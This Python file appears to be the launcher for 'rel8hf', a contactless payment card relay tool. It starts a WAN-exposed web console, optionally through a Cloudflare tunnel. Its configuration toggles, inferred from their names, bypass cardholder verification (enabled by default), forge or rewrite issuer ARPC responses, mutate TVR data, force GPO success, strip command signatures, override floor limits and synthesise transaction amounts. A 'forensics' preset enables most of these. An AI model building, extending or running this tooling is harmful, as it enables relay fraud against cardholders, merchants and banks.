#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Web console launcher for rel8hf.  Starts ONLY the web control hub.

No interactive prompts.  All relay toggles, profiles, and runtime settings
are managed by the operator through the WAN-exposed web UI.

Usage:
  python3 rel8hf_launcher.py
  python3 rel8hf_launcher.py --web-port 8080
  python3 rel8hf_launcher.py --config /path/to/saved.json
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional

DEFAULT_CONFIG_PATH = Path(__file__).with_name("rel8hf_last_config.json")
WEB_DIR = Path(__file__).resolve().parent / "web"


@dataclass
class LaunchConfig:
    host: str = "0.0.0.0"
    port: int = 5566
    policy_mode: str = "AUTO"
    policy_amount_cents: int = 200000
    outcome_guard: bool = True
    guard_verbose: bool = True
    full_output: bool = True
    gpo_force_success: bool = False
    tp_enabled: bool = False
    tp_strict_online: bool = True
    capdu_sig_verify: bool = False
    capdu_sig_strip: bool = True
    capdu_sig_pubkey: str = "keys/public.pem"
    verify_bypass: bool = True
    arpc_forge: bool = False
    arpc_rewrite: bool = False
    tvr_mutate: bool = False
    synth_plugin_enabled: bool = False
    synth_amount: int = 0
    synth_currency_code: int = 978
    synth_country_code: int = 250
    floor_limit_override_cents: int = 0
    card_present_timeout: float = 30.0

    @classmethod
    def from_json(cls, path: str | Path) -> "LaunchConfig":
        file_path = Path(path)
        if not file_path.exists():
            raise FileNotFoundError(f"Config file not found: {file_path}")
        with file_path.open("r", encoding="utf-8") as fh:
            data = json.load(fh)
        cfg = cls()
        for field_name in cls.__dataclass_fields__:
            if field_name in data:
                setattr(cfg, field_name, data[field_name])
        return cfg

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    def write_json(self, path: str | Path) -> Path:
        out = Path(path)
        out.parent.mkdir(parents=True, exist_ok=True)
        with out.open("w", encoding="utf-8") as fh:
            json.dump(self.to_dict(), fh, indent=2, sort_keys=True)
            fh.write("\n")
        return out

    def _risk_flags(self) -> List[str]:
        flags: List[str] = []
        if self.arpc_forge:
            flags.append("arpc_forge")
        if self.arpc_rewrite:
            flags.append("arpc_rewrite")
        if self.tvr_mutate:
            flags.append("tvr_mutate")
        if self.gpo_force_success:
            flags.append("gpo_force_success")
        if self.capdu_sig_verify:
            flags.append("capdu_sig_verify")
        return flags

    def risk_level(self) -> str:
        flags = self._risk_flags()
        if not flags:
            return "SAFE"
        if len(flags) >= 3:
            return "HIGH_RISK"
        return "MEDIUM_RISK"

    def validate(self) -> List[str]:
        errors: List[str] = []
        if not self.host:
            errors.append("host cannot be empty")
        if not isinstance(self.port, int) or not (1 <= self.port <= 65535):
            errors.append("port must be an integer in range 1..65535")
        if self.policy_mode not in {"OFFLINE_NOCVM", "ONLINE", "AUTO"}:
            errors.append("policy_mode must be one of: OFFLINE_NOCVM, ONLINE, AUTO")
        if self.policy_amount_cents < 0:
            errors.append("policy_amount_cents must be >= 0")
        if self.synth_amount < 0:
            errors.append("synth_amount must be >= 0")
        if not isinstance(self.synth_currency_code, int) or not (0 <= self.synth_currency_code <= 9999):
            errors.append("synth_currency_code must be in range 0..9999")
        if not isinstance(self.synth_country_code, int) or not (0 <= self.synth_country_code <= 9999):
            errors.append("synth_country_code must be in range 0..9999")
        if self.capdu_sig_verify:
            key_path = Path(self.capdu_sig_pubkey).expanduser()
            if not key_path.exists():
                errors.append(f"capdu_sig_pubkey does not exist: {key_path}")
        return errors

    def summary_lines(self) -> List[str]:
        return [
            f"host={self.host}:{self.port}",
            f"policy_mode={self.policy_mode}",
            f"policy_amount_cents={self.policy_amount_cents}",
            f"outcome_guard={self.outcome_guard}",
            f"guard_verbose={self.guard_verbose}",
            f"full_output={self.full_output}",
            f"gpo_force_success={self.gpo_force_success}",
            f"tp_enabled={self.tp_enabled}",
            f"tp_strict_online={self.tp_strict_online}",
            f"verify_bypass={self.verify_bypass}",
            f"arpc_forge={self.arpc_forge}",
            f"arpc_rewrite={self.arpc_rewrite}",
            f"tvr_mutate={self.tvr_mutate}",
            f"synth_plugin_enabled={self.synth_plugin_enabled}",
            f"synth_amount={self.synth_amount}",
            f"synth_currency_code={self.synth_currency_code}",
            f"synth_country_code={self.synth_country_code}",
            f"capdu_sig_verify={self.capdu_sig_verify}",
            f"capdu_sig_strip={self.capdu_sig_strip}",
            f"capdu_sig_pubkey={self.capdu_sig_pubkey}",
            f"floor_limit_override_cents={self.floor_limit_override_cents}",
            f"card_present_timeout={self.card_present_timeout}",
            f"risk_level={self.risk_level()}",
        ]

    def apply_env(self) -> None:
        os.environ.pop("RELAY_ALLOW_OPEN_CIDR", None)
        os.environ.pop("RELAY_ALLOWED_CIDRS", None)

        if self.policy_mode == "AUTO":
            os.environ.pop("RELAY_POLICY_MODE", None)
        else:
            os.environ["RELAY_POLICY_MODE"] = self.policy_mode

        os.environ["RELAY_POLICY_AMOUNT_CENTS"] = str(self.policy_amount_cents)
        os.environ["RELAY_OUTCOME_GUARD"] = "1" if self.outcome_guard else "0"
        os.environ["RELAY_GUARD_VERBOSE"] = "1" if self.guard_verbose else "0"
        os.environ["RELAY_FULL_OUTPUT"] = "1" if self.full_output else "0"
        os.environ["RELAY_GPO_FORCE_SUCCESS"] = "1" if self.gpo_force_success else "0"
        os.environ["RELAY_TP_ENABLED"] = "1" if self.tp_enabled else "0"
        os.environ["RELAY_TP_STRICT_ONLINE"] = "1" if self.tp_strict_online else "0"
        os.environ["RELAY_CAPDU_SIG_VERIFY"] = "1" if self.capdu_sig_verify else "0"
        os.environ["RELAY_CAPDU_SIG_STRIP"] = "1" if self.capdu_sig_strip else "0"
        os.environ["RELAY_CAPDU_SIG_PUBKEY"] = self.capdu_sig_pubkey
        os.environ["RELAY_SYNTH_PLUGIN_ENABLED"] = "1" if self.synth_plugin_enabled else "0"
        os.environ["RELAY_SYNTH_AMOUNT"] = str(self.synth_amount)
        os.environ["RELAY_SYNTH_CURRENCY_CODE"] = str(self.synth_currency_code)
        os.environ["RELAY_SYNTH_COUNTRY_CODE"] = str(self.synth_country_code)
        if self.floor_limit_override_cents > 0:
            os.environ["RELAY_FLOOR_LIMIT_OVERRIDE_CENTS"] = str(self.floor_limit_override_cents)
        else:
            os.environ.pop("RELAY_FLOOR_LIMIT_OVERRIDE_CENTS", None)
        os.environ["RELAY_CARD_PRESENT_TIMEOUT"] = str(self.card_present_timeout)

    def apply_runtime_state(self, server: Any) -> None:
        server.state.verify_bypass_enabled = self.verify_bypass
        server.state.arpc_forge_enabled = self.arpc_forge
        server.state.arpc_rewrite_enabled = self.arpc_rewrite
        server.state.tvr_mutation_enabled = self.tvr_mutate
        if hasattr(server, "card_present_timeout_seconds"):
            server.card_present_timeout_seconds = self.card_present_timeout


# ------------------------------------------------------------------
# Presets (also exposed via web API so the operator can switch
# profiles without restarting the launcher)
# ------------------------------------------------------------------
PRESETS: Dict[str, Dict[str, Any]] = {
    "safe_default": {
        "policy_mode": "OFFLINE_NOCVM", "policy_amount_cents": 200000,
        "outcome_guard": True, "guard_verbose": True, "full_output": True,
        "gpo_force_success": False, "tp_enabled": False, "tp_strict_online": True,
        "capdu_sig_verify": False, "capdu_sig_strip": True,
        "verify_bypass": True, "arpc_forge": False, "arpc_rewrite": False,
        "tvr_mutate": False, "synth_plugin_enabled": False,
        "synth_amount": 0, "synth_currency_code": 978, "synth_country_code": 250,
        "floor_limit_override_cents": 0, "card_present_timeout": 30.0,
    },
    "quick_run": {
        "policy_mode": "AUTO", "policy_amount_cents": 200000,
        "outcome_guard": True, "guard_verbose": True, "full_output": True,
        "gpo_force_success": False, "tp_enabled": False, "tp_strict_online": True,
        "capdu_sig_verify": False, "capdu_sig_strip": True,
        "verify_bypass": True, "arpc_forge": False, "arpc_rewrite": False,
        "tvr_mutate": False, "synth_plugin_enabled": False,
        "synth_amount": 0, "synth_currency_code": 978, "synth_country_code": 250,
        "floor_limit_override_cents": 0, "card_present_timeout": 30.0,
    },
    "forensics": {
        "policy_mode": "OFFLINE_NOCVM", "policy_amount_cents": 200000,
        "outcome_guard": True, "guard_verbose": True, "full_output": True,
        "gpo_force_success": True, "tp_enabled": True, "tp_strict_online": True,
        "capdu_sig_verify": False, "capdu_sig_strip": True,
        "verify_bypass": True, "arpc_forge": True, "arpc_rewrite": True,
        "tvr_mutate": True, "synth_plugin_enabled": False,
        "synth_amount": 0, "synth_currency_code": 978, "synth_country_code": 250,
        "floor_limit_override_cents": 0, "card_present_timeout": 30.0,
    },
}


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Launch rel8hf web control console. All toggles managed via web UI.",
    )
    parser.add_argument("--config", type=str, help="JSON path for a saved launch config")
    parser.add_argument("--host", help="Override relay bind host")
    parser.add_argument("--port", type=int, help="Override relay bind UDP port")
    parser.add_argument("--web-host", default="0.0.0.0", help="Web console bind host (default: 0.0.0.0)")
    parser.add_argument("--web-port", type=int, default=8090, help="Web console port (default: 8090)")
    parser.add_argument("--dry-run", action="store_true", help="Validate config and print summary without starting")
    parser.add_argument("--print-config", action="store_true", help="Print effective config and exit")
    parser.add_argument("--cf-tunnel", type=str, default=None, help="Cloudflare tunnel token (starts cloudflared tunnel on launch)")
    return parser


def _load_config(args: argparse.Namespace) -> LaunchConfig:
    if args.config:
        cfg = LaunchConfig.from_json(args.config)
    else:
        cfg = LaunchConfig()

    if args.host:
        cfg.host = args.host
    if args.port is not None:
        cfg.port = args.port
    return cfg


class CloudflaredTunnel:
    def __init__(self, token: str, local_port: int, state: Any = None) -> None:
        self.token = token
        self.local_port = local_port
        self.state = state
        self.proc: Optional[subprocess.Popen] = None
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()

    def start(self) -> bool:
        if self.proc is not None and self.proc.poll() is None:
            return True
        try:
            self.proc = subprocess.Popen(
                ["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", self.token],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
        except FileNotFoundError:
            print("cloudflared not found — install it or remove --cf-tunnel")
            if self.state:
                self.state.append("server", "[cloudflared] binary not found — tunnel disabled")
            return False
        self._thread = threading.Thread(target=self._read_loop, daemon=True)
        self._thread.start()
        print(f"Cloudflare tunnel started → http://localhost:{self.local_port}")
        if self.state:
            self.state.append("server", "[cloudflared] tunnel started")
        return True

    def _read_loop(self) -> None:
        assert self.proc is not None
        for line in self.proc.stdout:
            if self._stop.is_set():
                break
            line = line.strip()
            if not line:
                continue
            if self.state:
                self.state.append("server", f"[cloudflared] {line}")
            if "https://" in line and ".trycloudflare.com" in line:
                url = line.split("https://")[-1].split()[0].rstrip(".,")
                url = "https://" + url
                if self.state:
                    self.state.append("server", f"[cloudflared] TUNNEL URL: {url}")
                print(f"  Tunnel URL: {url}")

    def stop(self) -> None:
        self._stop.set()
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
        self.proc = None
        if self.state:
            self.state.append("server", "[cloudflared] tunnel stopped")


def _print_summary(cfg: LaunchConfig) -> None:
    print("\nLaunch Summary")
    for line in cfg.summary_lines():
        print(f"  {line}")
    print("")


def _run_web_console(args: argparse.Namespace, cfg: LaunchConfig) -> int:
    if str(WEB_DIR) not in sys.path:
        sys.path.insert(0, str(WEB_DIR))

    from web_server import WebState, run_web_server, attach_log_capture

    state = WebState()
    state.launch_config = cfg
    state.relay_host = cfg.host
    state.relay_port = cfg.port
    state.sync_toggles_from_config()
    attach_log_capture(state)

    os.environ["REL8HF_WEB_HOST"] = args.web_host
    os.environ["REL8HF_WEB_PORT"] = str(args.web_port)

    state.append("server", "[web] relay not started — use the web UI to start it")

    tunnel: Optional[CloudflaredTunnel] = None
    if args.cf_tunnel:
        tunnel = CloudflaredTunnel(args.cf_tunnel, args.web_port, state)
        tunnel.start()

    print(f"\nWeb console:  http://{args.web_host}:{args.web_port}")
    if tunnel:
        print(f"CF tunnel:    enabled (token={args.cf_tunnel[:12]}...)")
    print(f"Relay bind:   {cfg.host}:{cfg.port}  (waiting for web UI)")
    print("Press Ctrl+C to shut down.\n")

    state.cf_tunnel = tunnel

    try:
        run_web_server(state=state, host=args.web_host, port=args.web_port)
    except KeyboardInterrupt:
        print("\nInterrupted by user. Shutting down.")
    finally:
        if tunnel:
            tunnel.stop()
        if state.is_relay_running():
            state.stop_relay()
    return 0


def main() -> int:
    parser = _build_parser()
    args = parser.parse_args()

    try:
        cfg = _load_config(args)

        errors = cfg.validate()
        if errors:
            for err in errors:
                print(f"CONFIG ERROR: {err}")
            return 2

        if args.print_config or args.dry_run:
            _print_summary(cfg)
            if args.dry_run:
                print("Dry run: not starting web console.")
            if args.print_config:
                print("Printed config only. Exiting.")
            return 0

        _print_summary(cfg)

        return _run_web_console(args, cfg)

    except Exception as exc:
        print(f"FATAL LAUNCH ERROR: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
